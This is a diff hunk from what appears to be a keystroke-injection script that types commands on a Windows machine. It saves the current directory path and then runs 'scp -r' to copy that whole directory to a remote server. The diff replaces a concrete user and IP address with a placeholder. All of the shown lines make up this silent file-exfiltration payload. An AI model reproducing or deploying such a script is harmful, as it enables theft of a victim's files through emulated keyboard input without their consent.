@@ -27,7 +27,7 @@ type("set var=%cd%");
 delay(500);
 press("ENTER");
 delay(500);
-type("scp -r %var% jarvis@72.14.177.48:");
+type("scp -r %var% username@IP-Adresse:");
 delay(500);
 press("ENTER");
 delay(3000);
